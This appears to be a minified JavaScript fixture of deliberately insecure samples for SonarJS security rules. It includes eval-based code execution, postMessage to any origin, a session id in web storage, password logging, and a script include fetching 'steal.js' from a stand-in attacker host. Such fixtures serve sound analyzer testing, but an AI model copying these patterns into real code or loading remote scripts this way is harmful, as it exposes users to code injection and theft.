var SonarJS={"RSPEC-3523":function(data){var obj=new Function("return "+data)()},"RSPEC-2819":function(message){var myWindow=document.getElementById("myIFrame").contentWindow;myWindow.postMessage(message,"*")},"RSPEC-1523":function(propName){var value=eval("obj."+propName)},"RSPEC-1525":function(){var i;for(i=1;i<5;i++){Debug.write("loop index is "+i);debugger}},"RSPEC-1442":function(){alert("Unexpected Condition")},"RSPEC-2817":function(){var db=window.openDatabase("myDb","1.0","Personal secrets stored here",2*1024*1024)},"RSPEC-3271":function(login,sessionId){localStorage.setItem("login",login);sessionStorage.setItem("sessionId",sessionId)},"RSPEC-2611":function(){function include(url){var s=document.createElement("script");s.setAttribute("type","text/javascript");s.setAttribute("src",url);document.body.appendChild(s)}include("http://hackers.com/steal.js")},"RSPEC-2228":function(password_entered){console.log(password_entered)}};
